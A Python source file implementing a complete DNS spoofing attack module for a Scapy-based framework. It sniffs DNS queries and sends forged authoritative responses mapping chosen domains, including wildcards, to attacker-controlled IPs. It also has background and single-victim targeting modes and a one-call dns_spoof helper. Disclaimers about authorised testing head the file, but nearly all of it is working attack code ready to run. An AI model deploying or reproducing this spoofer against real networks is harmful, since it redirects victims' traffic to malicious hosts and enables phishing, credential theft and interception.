"""
DNS Spoofing Attack Module for Scapy Framework

⚠️  CRITICAL ETHICAL WARNING ⚠️
This module is for EDUCATIONAL and AUTHORIZED SECURITY TESTING ONLY.
Unauthorized DNS spoofing is ILLEGAL and can result in criminal prosecution.

Only use in:
- Controlled laboratory environments
- Authorized penetration testing engagements
- Educational demonstrations with proper authorization
- Your own network infrastructure

The authors assume NO responsibility for misuse of this tool.
"""

from typing import Optional, Dict, List, Callable, Any
from scapy.all import (
    DNS, DNSQR, DNSRR, IP, UDP, sniff, send, conf
)
import threading
import time

from scapy_framework.core.logger import get_logger

logger = get_logger(__name__)


class DNSSpoofer:
    """
    DNS Spoofing attack implementation.

    Intercepts DNS queries and responds with forged answers,
    redirecting victims to malicious or controlled IP addresses.

    ⚠️  WARNING: Use only with explicit authorization!
    """

    def __init__(self, interface: Optional[str] = None, verbose: bool = False):
        """
        Initialize DNS Spoofer.

        Args:
            interface: Network interface to use
            verbose: Enable verbose output

        Examples:
            >>> spoofer = DNSSpoofer(interface='eth0')
        """
        self.interface = interface or conf.iface
        self.verbose = verbose
        self.is_spoofing = False
        self.spoof_thread: Optional[threading.Thread] = None

        # Spoofing rules: domain -> IP mapping
        self.spoof_rules: Dict[str, str] = {}

        # Statistics
        self.stats = {
            'queries_intercepted': 0,
            'queries_spoofed': 0,
            'start_time': None,
            'end_time': None,
        }

        logger.warning("⚠️  DNS Spoofer initialized - ENSURE AUTHORIZATION BEFORE USE!")
        logger.info(f"Using interface: {self.interface}")

    def add_rule(self, domain: str, fake_ip: str) -> None:
        """
        Add DNS spoofing rule.

        Args:
            domain: Domain to spoof (supports wildcards)
            fake_ip: Fake IP address to return

        Examples:
            >>> spoofer.add_rule('example.com', '192.168.1.100')
            >>> spoofer.add_rule('*.google.com', '10.0.0.1')  # Wildcard
        """
        self.spoof_rules[domain] = fake_ip
        logger.info(f"Added DNS spoofing rule: {domain} -> {fake_ip}")

    def remove_rule(self, domain: str) -> None:
        """
        Remove DNS spoofing rule.

        Args:
            domain: Domain to remove
        """
        if domain in self.spoof_rules:
            del self.spoof_rules[domain]
            logger.info(f"Removed DNS spoofing rule for {domain}")

    def clear_rules(self) -> None:
        """
        Clear all DNS spoofing rules.
        """
        self.spoof_rules.clear()
        logger.info("Cleared all DNS spoofing rules")

    def get_rules(self) -> Dict[str, str]:
        """
        Get all DNS spoofing rules.

        Returns:
            Dictionary of domain -> IP mappings
        """
        return self.spoof_rules.copy()

    def _match_domain(self, qname: str, rule_domain: str) -> bool:
        """
        Check if query name matches rule domain (supports wildcards).

        Args:
            qname: Queried domain name
            rule_domain: Rule domain (may contain wildcards)

        Returns:
            True if matches
        """
        import re

        # Normalize domains
        qname = qname.lower().rstrip('.')
        rule_domain = rule_domain.lower().rstrip('.')

        # Exact match
        if qname == rule_domain:
            return True

        # Wildcard match
        if '*' in rule_domain:
            # Convert wildcard to regex
            pattern = rule_domain.replace('.', '\\.').replace('*', '.*')
            return bool(re.match(f'^{pattern}$', qname))

        return False

    def _get_fake_ip(self, qname: str) -> Optional[str]:
        """
        Get fake IP for a queried domain.

        Args:
            qname: Queried domain name

        Returns:
            Fake IP or None if no rule matches
        """
        qname = qname.lower().rstrip('.')

        # Check all rules
        for rule_domain, fake_ip in self.spoof_rules.items():
            if self._match_domain(qname, rule_domain):
                return fake_ip

        return None

    def _packet_handler(self, packet):
        """
        Handle intercepted DNS packets.

        Args:
            packet: Intercepted packet
        """
        # Check if it's a DNS query
        if not packet.haslayer(DNS) or not packet.haslayer(DNSQR):
            return

        dns_layer = packet.getlayer(DNS)

        # Only process queries (qr=0)
        if dns_layer.qr != 0:
            return

        self.stats['queries_intercepted'] += 1

        # Get query name
        qname = packet[DNSQR].qname
        if isinstance(qname, bytes):
            qname = qname.decode('utf-8')

        # Check if we should spoof this domain
        fake_ip = self._get_fake_ip(qname)
        if not fake_ip:
            return

        # Create spoofed DNS response
        try:
            spoofed_pkt = IP(
                dst=packet[IP].src,
                src=packet[IP].dst
            ) / UDP(
                dport=packet[UDP].sport,
                sport=53
            ) / DNS(
                id=packet[DNS].id,
                qr=1,  # Response
                aa=1,  # Authoritative answer
                qd=packet[DNS].qd,  # Original question
                an=DNSRR(
                    rrname=packet[DNSQR].qname,
                    ttl=10,
                    rdata=fake_ip
                )
            )

            send(spoofed_pkt, iface=self.interface, verbose=self.verbose)
            self.stats['queries_spoofed'] += 1

            if self.verbose:
                logger.info(f"Spoofed DNS: {qname.rstrip('.')} -> {fake_ip}")

        except Exception as e:
            logger.error(f"Error spoofing DNS for {qname}: {e}")

    def spoof(self,
              filter: str = "udp port 53",
              count: int = 0,
              timeout: Optional[int] = None) -> None:
        """
        Start DNS spoofing.

        Args:
            filter: BPF filter for DNS packets
            count: Number of packets to process (0 = infinite)
            timeout: Spoofing timeout in seconds

        Examples:
            >>> spoofer.add_rule('example.com', '192.168.1.100')
            >>> spoofer.spoof()
        """
        if not self.spoof_rules:
            logger.warning("No DNS spoofing rules defined!")
            return

        logger.critical("⚠️  STARTING DNS SPOOFING ATTACK ⚠️")
        logger.warning(f"Spoofing {len(self.spoof_rules)} domain(s)")
        logger.warning("ENSURE YOU HAVE AUTHORIZATION!")

        self.stats['start_time'] = time.time()
        self.stats['queries_intercepted'] = 0
        self.stats['queries_spoofed'] = 0
        self.is_spoofing = True

        try:
            sniff(
                iface=self.interface,
                filter=filter,
                prn=self._packet_handler,
                count=count,
                timeout=timeout,
                store=False
            )

        except KeyboardInterrupt:
            logger.info("DNS spoofing interrupted by user")
        except PermissionError:
            logger.error("Permission denied. DNS spoofing requires root/admin privileges.")
            raise
        except Exception as e:
            logger.error(f"DNS spoofing failed: {e}")
            raise
        finally:
            self.is_spoofing = False
            self.stats['end_time'] = time.time()
            logger.info(f"DNS spoofing stopped. Intercepted {self.stats['queries_intercepted']} queries, "
                       f"spoofed {self.stats['queries_spoofed']}")

    def spoof_background(self,
                         filter: str = "udp port 53",
                         timeout: Optional[int] = None) -> None:
        """
        Start DNS spoofing in background thread.

        Args:
            filter: BPF filter for DNS packets
            timeout: Spoofing timeout

        Examples:
            >>> spoofer.add_rule('example.com', '192.168.1.100')
            >>> spoofer.spoof_background()
            >>> # Do other work...
            >>> spoofer.stop()
        """
        if self.is_spoofing:
            logger.warning("DNS spoofing already running")
            return

        self.spoof_thread = threading.Thread(
            target=lambda: self.spoof(filter=filter, timeout=timeout),
            daemon=True
        )
        self.spoof_thread.start()
        logger.info("DNS spoofing started in background")

    def stop(self) -> None:
        """
        Stop DNS spoofing.

        Note: Due to scapy's sniff implementation, may take a moment to stop.

        Examples:
            >>> spoofer.stop()
        """
        if self.is_spoofing:
            logger.info("Stopping DNS spoofing...")
            self.is_spoofing = False

            if self.spoof_thread:
                self.spoof_thread.join(timeout=5)

            logger.info("DNS spoofing stopped")
        else:
            logger.warning("DNS spoofing is not running")

    def spoof_single_target(self,
                            target_ip: str,
                            domain: str,
                            fake_ip: str,
                            count: int = 0,
                            timeout: Optional[int] = None) -> None:
        """
        Spoof DNS for a specific target IP.

        Args:
            target_ip: Target victim IP
            domain: Domain to spoof
            fake_ip: Fake IP to return
            count: Number of packets to process
            timeout: Timeout in seconds

        Examples:
            >>> spoofer.spoof_single_target('192.168.1.100', 'example.com', '10.0.0.1')
        """
        # Add rule
        self.add_rule(domain, fake_ip)

        # Create filter for specific target
        filter = f"udp port 53 and ip src {target_ip}"

        logger.info(f"Targeting DNS spoofing at {target_ip}")

        try:
            self.spoof(filter=filter, count=count, timeout=timeout)
        finally:
            # Remove rule after spoofing
            self.remove_rule(domain)

    def get_statistics(self) -> Dict[str, Any]:
        """
        Get DNS spoofing statistics.

        Returns:
            Dictionary with statistics

        Examples:
            >>> stats = spoofer.get_statistics()
            >>> print(f"Spoofed: {stats['queries_spoofed']}")
        """
        duration = 0
        if self.stats['start_time'] and self.stats['end_time']:
            duration = self.stats['end_time'] - self.stats['start_time']

        return {
            'queries_intercepted': self.stats['queries_intercepted'],
            'queries_spoofed': self.stats['queries_spoofed'],
            'spoof_rate': (self.stats['queries_spoofed'] / self.stats['queries_intercepted'] * 100)
                         if self.stats['queries_intercepted'] > 0 else 0,
            'duration': duration,
            'rules_count': len(self.spoof_rules),
            'is_running': self.is_spoofing,
        }

    def print_statistics(self) -> None:
        """
        Print DNS spoofing statistics to console.

        Examples:
            >>> spoofer.print_statistics()
        """
        stats = self.get_statistics()

        print("\n" + "=" * 60)
        print("DNS SPOOFING STATISTICS")
        print("=" * 60)
        print(f"Queries Intercepted:  {stats['queries_intercepted']}")
        print(f"Queries Spoofed:      {stats['queries_spoofed']}")
        print(f"Spoof Rate:           {stats['spoof_rate']:.1f}%")
        print(f"Duration:             {stats['duration']:.2f} seconds")
        print(f"Active Rules:         {stats['rules_count']}")
        print(f"Status:               {'Running' if stats['is_running'] else 'Stopped'}")

        if self.spoof_rules:
            print("\nSpoofing Rules:")
            for domain, ip in self.spoof_rules.items():
                print(f"  {domain:<30} -> {ip}")

        print("=" * 60 + "\n")


def dns_spoof(domain: str,
              fake_ip: str,
              interface: Optional[str] = None,
              count: int = 10,
              timeout: int = 60) -> None:
    """
    Quick DNS spoofing function.

    Args:
        domain: Domain to spoof
        fake_ip: Fake IP address
        interface: Network interface
        count: Number of packets to spoof (0 = infinite)
        timeout: Timeout in seconds

    Examples:
        >>> dns_spoof('example.com', '192.168.1.100', count=5)
    """
    spoofer = DNSSpoofer(interface=interface, verbose=True)
    spoofer.add_rule(domain, fake_ip)

    try:
        spoofer.spoof(count=count, timeout=timeout)
    finally:
        spoofer.print_statistics()
